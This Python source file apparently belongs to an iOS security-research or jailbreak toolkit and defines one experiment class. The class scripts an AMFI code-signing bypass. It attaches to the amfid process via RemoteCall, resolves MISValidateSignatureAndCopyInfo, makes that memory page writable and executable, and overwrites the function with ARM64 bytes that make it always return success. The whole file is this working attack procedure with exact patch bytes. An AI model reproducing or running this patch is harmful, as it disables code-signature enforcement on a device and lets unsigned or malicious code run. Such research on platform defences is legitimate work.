"""
Experiment: AMFI bypass via RemoteCall patch to amfid.
Port from: exp_amfid_patch.swift

Steps:
1. Find amfid process
2. Connect RemoteCall to amfid
3. dlsym MISValidateSignature
4. Read original bytes
5. mprotect RWX
6. Write patch bytes (NOP or always-return-0)
"""

from typing import List
from src.research.experiment_base import ExperimentBase
from src.core.research_console import ResearchStep


class ExpAmfidRCPatch(ExperimentBase):
    @property
    def name(self) -> str:
        return "amfid_rc_patch"

    @property
    def description(self) -> str:
        return "Bypass AMFI by patching MISValidateSignature in amfid via RemoteCall"

    def build_steps(self) -> List[ResearchStep]:
        return [
            ResearchStep(
                name="Find amfid process",
                command="FIND_PROC_BY_NAME:amfid",
                timeout=5.0,
            ),
            ResearchStep(
                name="Connect RemoteCall to amfid",
                command="RC_CONNECT:amfid",
                timeout=10.0,
            ),
            ResearchStep(
                name="dlsym MISValidateSignature",
                command="RC_DLSYM:amfid:MISValidateSignatureAndCopyInfo",
                timeout=5.0,
            ),
            ResearchStep(
                name="Read original bytes at target",
                command="RC_READ:amfid:$LAST_RESULT:8",
                timeout=5.0,
            ),
            ResearchStep(
                name="mprotect RWX on target page",
                command="RC_MPROTECT:amfid:$TARGET_PAGE:0x4000:7",
                timeout=5.0,
            ),
            ResearchStep(
                name="Write patch bytes (mov x0, #0; ret)",
                command="RC_WRITE:amfid:$TARGET_ADDR:d2800000d65f03c0",
                timeout=5.0,
                description="This is the step most likely to panic",
            ),
            ResearchStep(
                name="Verify patch applied",
                command="RC_READ:amfid:$TARGET_ADDR:8",
                timeout=5.0,
            ),
        ]
